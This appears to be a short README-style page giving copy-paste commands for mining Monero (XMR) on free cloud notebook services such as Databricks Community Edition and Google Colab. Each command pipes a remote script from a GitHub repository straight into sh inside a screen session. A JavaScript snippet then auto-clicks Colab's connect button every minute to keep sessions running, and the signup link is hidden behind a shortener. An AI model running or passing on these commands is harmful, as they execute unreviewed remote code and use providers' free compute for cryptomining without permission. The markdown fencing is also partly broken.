# Edit + Copy + Paste 
* Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
```markdown
cd /root
screen -R xmr
curl https://raw.githubusercontent.com/ashryr/get-xmr/main/databricks.sh | sh
```
screen -R xmr
curl https://raw.githubusercontent.com/ashryr/get-xmr/main/gcolab-sg.sh | sh
```
```markdown
screen -R xmr
curl https://raw.githubusercontent.com/ashryr/get-xmr/main/gcolab-us.sh | sh
```
```markdown
screen -R xmr
curl https://raw.githubusercontent.com/ashryr/get-xmr/main/nvidiacolab-us.sh | sh
```
* Auto Reconnect GColab:
```markdown
var startClickConnect = function startClickConnect(){ var clickConnect = function clickConnect(){ console.log("Connnect Clicked - Start"); document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click(); console.log("Connnect Clicked - End"); }; var intervalId = setInterval(clickConnect, 60000); var stopClickConnectHandler = function stopClickConnect() { console.log("Connnect Clicked Stopped - Start"); clearInterval(intervalId); console.log("Connnect Clicked Stopped - End"); }; return stopClickConnectHandler; }; var stopClickConnect = startClickConnect();
```
